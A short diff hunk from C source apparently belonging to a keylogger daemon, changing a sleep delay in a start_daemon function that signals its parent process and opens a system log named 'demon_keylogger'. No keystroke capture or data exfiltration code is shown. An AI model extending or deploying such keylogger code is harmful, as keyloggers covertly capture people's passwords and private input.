@@ -66,7 +66,7 @@ void start_daemon() {
     }
 
     kill(getppid(), SIGINT);
-    usleep(100000);
+    usleep(150000);
 
     // Open the log file
     openlog("demon_keylogger", LOG_PID, LOG_DAEMON);
